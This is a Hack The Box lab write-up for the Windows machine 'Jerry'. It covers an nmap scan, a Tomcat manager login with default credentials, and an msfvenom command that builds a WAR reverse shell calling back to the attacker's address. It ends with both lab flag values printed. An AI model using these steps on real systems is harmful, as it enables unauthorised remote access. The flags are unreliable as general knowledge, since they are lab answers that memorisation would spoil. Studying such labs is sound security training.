# Jerry
>Author : Xyan1d3
>Date : 10th July 2021
>IP : 10.10.10.95
>OS : Windows
>Difficulty : Easy
# Initial Enumeration
## Nmap
```sql
# Nmap 7.91 scan initiated Sat Jul 10 00:29:03 2021 as: nmap -sC -sV -v -oN nmap/jerry 10.10.10.95
Nmap scan report for jerry.htb (10.10.10.95)
Host is up (0.093s latency).
Not shown: 999 filtered ports
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
```

# Initial FootHold
We visit the site and find out that it is running apache tomcat.
![[Pasted image 20210710003714.png]]

We go to the `manager` app and try default credentials which are `tomcat` and `s3cret`.
![[Pasted image 20210710004248.png]]
We could now generate a malicious war file using `msfvenom`.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.18]─[~/htb/jerry]
└──╼ # msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.18 LPORT=8888 -f war -o magisk.war
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of war file: 52383 bytes
Saved as: magisk.war
```

We upload and deploy the file on the `manager`.
![[Pasted image 20210710004824.png]]

We deploy the `war` file and visit the link.
![[Pasted image 20210710011202.png]]

We have to visit the jsp file inside which is inside the `war` file while listening on the port.
![[Pasted image 20210710011329.png]]

We visit the `jsp` file and get a shell on the box.
![[Pasted image 20210710011433.png]]

We get a shell on the box as `NT Authority/SYSTEM`.
![[Pasted image 20210710011534.png]]

## Getting user & root Flag
```python
C:\Users\Administrator\Desktop\flags>dir  
dir
 Volume in drive C has no label.
 Volume Serial Number is FC2B-E489

 Directory of C:\Users\Administrator\Desktop\flags

06/19/2018  07:09 AM    <DIR>          .
06/19/2018  07:09 AM    <DIR>          ..
06/19/2018  07:11 AM                88 2 for the price of 1.txt
               1 File(s)             88 bytes
               2 Dir(s)  27,602,296,832 bytes free

C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
type "2 for the price of 1.txt"
user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e
```